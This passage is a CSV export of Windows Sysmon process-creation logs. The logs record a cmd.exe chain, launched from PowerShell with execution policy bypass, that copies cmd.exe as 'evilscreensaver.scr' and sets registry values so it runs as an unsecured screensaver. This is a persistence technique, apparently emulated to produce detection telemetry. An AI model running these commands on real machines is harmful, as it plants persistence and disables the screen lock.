ParentCommandLine: ""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg & copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f & if 0 NEQ 0 shutdown /r /t 0

ParentUser: WINDEV2309EVAL\User",Info,reg.exe,"""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg & copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f & if 0 NEQ 0 shutdown /r /t 0",C:\Windows\System32\cmd.exe,{fda94052-c742-658c-5c02-000000000b00},7156,WINDEV2309EVAL\User,{fda94052-c742-658c-5f02-000000000b00},7044,9988,Microsoft Windows Operating System,,,,"
      ",-,2023-12-28T00:54:26.2713892Z,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 00:54:26.270,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T00:54:26.2713892Z""/>
      <EventRecordID>9445</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 00:54:26.270</Data>
      <Data Name=""ProcessGuid"">{fda94052-c742-658c-5f02-000000000b00}</Data>
      <Data Name=""ProcessId"">9988</Data>
      <Data Name=""Image"">C:\Windows\System32\reg.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Registry Console Tool</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">reg.exe</Data>
      <Data Name=""CommandLine"">reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-c742-658c-5c02-000000000b00}</Data>
      <Data Name=""ParentProcessId"">7156</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg &amp; copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f &amp; if 0 NEQ 0 shutdown /r /t 0</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 00:54:26.270

ProcessGuid: {fda94052-c742-658c-5f02-000000000b00}

ProcessId: 9988

Image: C:\Windows\System32\reg.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Console Tool

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: reg.exe

CommandLine: reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D

ParentProcessGuid: {fda94052-c742-658c-5c02-000000000b00}

ParentProcessId: 7156

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg &amp; copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f &amp; if 0 NEQ 0 shutdown /r /t 0

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"reg  export ""HKEY_CURRENT_USER\Control Panel\Desktop"" C:\Users\User\backup.reg ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Registry Console Tool,1,9444,10.0.22621.1 (WinBuild.160101.0800),"MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D",C:\Windows\System32\reg.exe,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 00:54:26.238

ProcessGuid: {fda94052-c742-658c-5e02-000000000b00}

ProcessId: 2452

Image: C:\Windows\System32\reg.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Console Tool

Product: Microsoft Windows Operating System

Company: Microsoft Corporation

OriginalFileName: reg.exe

CommandLine: reg  export ""HKEY_CURRENT_USER\Control Panel\Desktop"" C:\Users\User\backup.reg 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D

ParentProcessGuid: {fda94052-c742-658c-5c02-000000000b00}

ParentProcessId: 7156

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg & copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f & if 0 NEQ 0 shutdown /r /t 0

ParentUser: WINDEV2309EVAL\User",Info,reg.exe,"""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg & copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f & if 0 NEQ 0 shutdown /r /t 0",C:\Windows\System32\cmd.exe,{fda94052-c742-658c-5c02-000000000b00},7156,WINDEV2309EVAL\User,{fda94052-c742-658c-5e02-000000000b00},7044,2452,Microsoft Windows Operating System,,,,"
      ",-,2023-12-28T00:54:26.2429976Z,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 00:54:26.238,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T00:54:26.2429976Z""/>
      <EventRecordID>9444</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 00:54:26.238</Data>
      <Data Name=""ProcessGuid"">{fda94052-c742-658c-5e02-000000000b00}</Data>
      <Data Name=""ProcessId"">2452</Data>
      <Data Name=""Image"">C:\Windows\System32\reg.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Registry Console Tool</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">reg.exe</Data>
      <Data Name=""CommandLine"">reg  export ""HKEY_CURRENT_USER\Control Panel\Desktop"" C:\Users\User\backup.reg </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-c742-658c-5c02-000000000b00}</Data>
      <Data Name=""ParentProcessId"">7156</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg &amp; copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f &amp; if 0 NEQ 0 shutdown /r /t 0</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 00:54:26.238

ProcessGuid: {fda94052-c742-658c-5e02-000000000b00}

ProcessId: 2452

Image: C:\Windows\System32\reg.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Console Tool

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: reg.exe

CommandLine: reg  export ""HKEY_CURRENT_USER\Control Panel\Desktop"" C:\Users\User\backup.reg 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D

ParentProcessGuid: {fda94052-c742-658c-5c02-000000000b00}

ParentProcessId: 7156

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg &amp; copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f &amp; if 0 NEQ 0 shutdown /r /t 0

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %%userprofile%%\backup.reg & copy C:\Windows\System32\cmd.exe ""%%SystemRoot%%\System32\evilscreensaver.scr"" & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%%SystemRoot%%\System32\evilscreensaver.scr"" /f & if 0 NEQ 0 shutdown /r /t 0",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,9443,10.0.22621.1635 (WinBuild.160101.0800),"MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 00:54:26.195

ProcessGuid: {fda94052-c742-658c-5c02-000000000b00}

ProcessId: 7156

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft Windows Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %%userprofile%%\backup.reg & copy C:\Windows\System32\cmd.exe ""%%SystemRoot%%\System32\evilscreensaver.scr"" & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%%SystemRoot%%\System32\evilscreensaver.scr"" /f & if 0 NEQ 0 shutdown /r /t 0

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-c742-658c-5c02-000000000b00},7044,7156,Microsoft Windows Operating System,,,,"
      ",-,2023-12-28T00:54:26.1970166Z,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 00:54:26.195,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T00:54:26.1970166Z""/>
      <EventRecordID>9443</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 00:54:26.195</Data>
      <Data Name=""ProcessGuid"">{fda94052-c742-658c-5c02-000000000b00}</Data>
      <Data Name=""ProcessId"">7156</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %%userprofile%%\backup.reg &amp; copy C:\Windows\System32\cmd.exe ""%%SystemRoot%%\System32\evilscreensaver.scr"" &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%%SystemRoot%%\System32\evilscreensaver.scr"" /f &amp; if 0 NEQ 0 shutdown /r /t 0</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 00:54:26.195

ProcessGuid: {fda94052-c742-658c-5c02-000000000b00}

ProcessId: 7156

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %%userprofile%%\backup.reg &amp; copy C:\Windows\System32\cmd.exe ""%%SystemRoot%%\System32\evilscreensaver.scr"" &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%%SystemRoot%%\System32\evilscreensaver.scr"" /f &amp; if 0 NEQ 0 shutdown /r /t 0

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
